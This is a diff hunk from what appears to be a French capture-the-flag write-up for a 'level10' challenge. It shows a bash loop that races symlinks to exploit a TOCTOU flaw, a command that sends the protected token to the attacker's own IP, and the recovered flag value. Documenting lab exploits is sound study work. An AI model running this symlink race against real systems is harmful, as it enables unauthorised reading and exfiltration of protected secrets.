@@ -167,7 +167,11 @@ le programme est donc vulnerable au TOCTOU https://en.wikipedia.org/wiki/Time-of
 
 for (( ; ; )) ; do echo coucou > /tmp/coucou; ln -fs /tmp/coucou /tmp/dull; ln -fs $(pwd)/token /tmp/dull; done &
 
-
+puis lancer 2-3 fois 
+```
+level10 /tmp/dull IP_PC
+```
+on obtient woupa2yuojeeaaed06riuj63c
 
 
 
